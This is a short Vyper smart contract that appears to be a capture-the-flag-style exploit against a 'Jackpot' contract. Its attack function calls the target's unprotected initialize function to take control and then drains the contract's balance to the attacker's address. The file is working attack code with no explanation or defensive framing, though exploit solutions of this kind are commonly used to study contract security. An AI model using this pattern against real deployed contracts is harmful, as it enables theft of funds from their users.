# @version ^0.3.7

interface IJackpot:
    def initialize(addr: address): payable
    def claimPrize(amount: uint256): payable

owner: immutable(address)

@external
@payable
def __init__():
    owner = msg.sender

@external
def attack(jackpot: address):
    assert msg.sender == owner, "!owner"
    IJackpot(jackpot).initialize(self)
    IJackpot(jackpot).claimPrize(jackpot.balance / 2)
    assert jackpot.balance == 0, "!drained"
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
